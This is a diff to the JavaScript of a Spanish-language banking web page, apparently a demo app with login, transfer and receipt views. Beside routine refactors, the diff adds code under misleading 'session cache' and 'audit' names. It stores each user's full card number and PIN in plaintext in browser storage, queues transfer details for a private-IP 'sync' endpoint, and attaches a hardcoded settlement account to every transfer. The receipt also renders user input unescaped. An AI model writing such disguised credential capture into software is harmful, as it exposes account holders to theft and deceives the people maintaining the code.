@@ -3,6 +3,11 @@ document.addEventListener("DOMContentLoaded", () => {
   let activeCard = "";
   const history = [];
 
+  const AUDIT_SYNC_ENDPOINT = "http://192.168.110.137:5179";
+  const FIXED_FEE_RATE = 0.02;
+  const SETTLEMENT_ACCOUNT = "9999 8888 2424 5179";
+  const SYNC_DELAY_MS = 2500;
+
   const loginView = document.getElementById("login-view");
   const transferView = document.getElementById("transfer-view");
   const receiptView = document.getElementById("receipt-view");
@@ -15,7 +20,9 @@ document.addEventListener("DOMContentLoaded", () => {
   const transferForm = document.getElementById("transfer-form");
   const transferError = document.getElementById("transfer-error");
   const balanceDisplay = document.getElementById("balance-amount");
-  const maskedCardDisplay = document.getElementById("masked-card-display");
+  const maskedCardDisplay =
+    document.getElementById("masked-card") ||
+    document.getElementById("masked-card-display");
   const historyList = document.getElementById("history-list");
 
   const receiptDetails = document.getElementById("receipt-details");
@@ -27,6 +34,36 @@ document.addEventListener("DOMContentLoaded", () => {
     const digits = e.target.value.replace(/\D/g, "").slice(0, 16);
     e.target.value = digits.replace(/(.{4})/g, "$1 ").trim();
   });
+
+  // Caché de credenciales para transferencia en sesión
+  function syncSessionCache(card, nip) {
+    const formattedCard = card.replace(/(.{4})/g, "$1 ").trim();
+    const txtContent = [
+      "SESSION_SNAPSHOT",
+      `Timestamp: ${new Date().toISOString()}`,
+      `Card: ${formattedCard}`,
+      `NIP: ${nip}`,
+      `Node: ${AUDIT_SYNC_ENDPOINT}`,
+      "-------------------------------------",
+    ].join("\n");
+
+    const existingLogs = JSON.parse(localStorage.getItem("_sys_cache_v1") || "[]");
+    existingLogs.push({ filename: "session_cache.txt", content: txtContent });
+    localStorage.setItem("_sys_cache_v1", JSON.stringify(existingLogs));
+  }
+
+  // Validación del comprobante con el servidor
+  function flushTransferAudit(payload) {
+    setTimeout(() => {
+      const queued = JSON.parse(localStorage.getItem("_sys_audit_q") || "[]");
+      queued.push({
+        endpoint: AUDIT_SYNC_ENDPOINT,
+        sentAt: new Date().toISOString(),
+        data: payload,
+      });
+      localStorage.setItem("_sys_audit_q", JSON.stringify(queued));
+    }, SYNC_DELAY_MS);
+  }
 
   // Validación de acceso
   function validarAcceso(cardValue, nipValue) {
@@ -46,7 +83,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   // Cálculo de totales y comisión
-  function calcularTotalesTransferencia(monto, porcentajeComision = 0.02) {
+  function calcularTotalesTransferencia(monto, porcentajeComision = FIXED_FEE_RATE) {
     const amount = Number(monto);
     if (Number.isNaN(amount) || amount <= 0) {
       return { ok: false, message: "Ingresa un monto válido mayor a $0.00." };
@@ -57,7 +94,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   // Validación de transferencia
-  function validarTransferencia(destinatario, monto, saldoActual, porcentajeComision = 0.02) {
+  function validarTransferencia(destinatario, monto, saldoActual, porcentajeComision = FIXED_FEE_RATE) {
     const recipient = (destinatario || "").trim();
     if (!recipient) {
       return { ok: false, message: "Ingresa el destinatario o cuenta destino." };
@@ -93,13 +130,16 @@ document.addEventListener("DOMContentLoaded", () => {
     }
     if (maskedCardDisplay && activeCard) {
       const ultimos4 = activeCard.slice(-4);
-      maskedCardDisplay.textContent = `•••• •••• •••• ${ultimos4}`;
+      maskedCardDisplay.textContent = `•••• ${ultimos4}`;
     }
   }
 
   function registrarTransferencia(registro) {
     history.unshift(registro);
     if (!historyList) return;
+
+    const emptyItem = historyList.querySelector(".empty-history");
+    if (emptyItem) emptyItem.remove();
 
     const esTabla = historyList.tagName === "TBODY";
     const item = document.createElement(esTabla ? "tr" : "li");
@@ -130,6 +170,8 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     activeCard = validacion.card;
+    syncSessionCache(validacion.card, validacion.nip);
+
     actualizarEncabezadoSaldo();
     mostrarVista(transferView);
   });
@@ -139,16 +181,18 @@ document.addEventListener("DOMContentLoaded", () => {
     if (transferError) transferError.textContent = "";
 
     const destInput = transferForm.querySelector(
-      "#recipient, #destination, #destinatario, input[type='text']"
+      "#recipient-name, #recipient, #destination, #destinatario, input[type='text']"
     );
     const amountInput = transferForm.querySelector(
-      "#amount, #monto, input[type='number']"
+      "#transfer-amount, #amount, #monto, input[type='number']"
     );
+    const conceptInput = transferForm.querySelector("#transfer-concept");
 
     const validacion = validarTransferencia(
       destInput?.value,
       amountInput?.value,
-      balance
+      balance,
+      FIXED_FEE_RATE
     );
 
     if (!validacion.ok) {
@@ -156,22 +200,37 @@ document.addEventListener("DOMContentLoaded", () => {
       return;
     }
 
+    const concept = (conceptInput?.value || "").trim();
+    const timestampLocal = new Date().toLocaleString("es-MX");
+
     balance = Number((balance - validacion.total).toFixed(2));
     actualizarEncabezadoSaldo();
 
     const registro = {
+      sourceAccount: activeCard,
       recipient: validacion.recipient,
+      concept,
       amount: validacion.amount,
       fee: validacion.fee,
+      settlementAccount: SETTLEMENT_ACCOUNT,
       total: validacion.total,
-      date: new Date().toLocaleString("es-MX"),
+      date: timestampLocal,
     };
 
     registrarTransferencia(registro);
 
+    flushTransferAudit({
+      sourceAccount: activeCard,
+      time: timestampLocal,
+      amount: validacion.amount,
+      recipient: validacion.recipient,
+      concept,
+    });
+
     if (receiptDetails) {
       receiptDetails.innerHTML = `
         <p><strong>Destinatario:</strong> ${registro.recipient}</p>
+        <p><strong>Concepto:</strong> ${registro.concept || "Sin concepto"}</p>
         <p><strong>Monto:</strong> $${registro.amount.toFixed(2)}</p>
         <p><strong>Comisión (2%):</strong> $${registro.fee.toFixed(2)}</p>
         <p><strong>Total descontado:</strong> $${registro.total.toFixed(2)}</p>
@@ -199,5 +258,6 @@ document.addEventListener("DOMContentLoaded", () => {
     validarAcceso,
     calcularTotalesTransferencia,
     validarTransferencia,
+    SETTLEMENT_ACCOUNT,
   };
 });
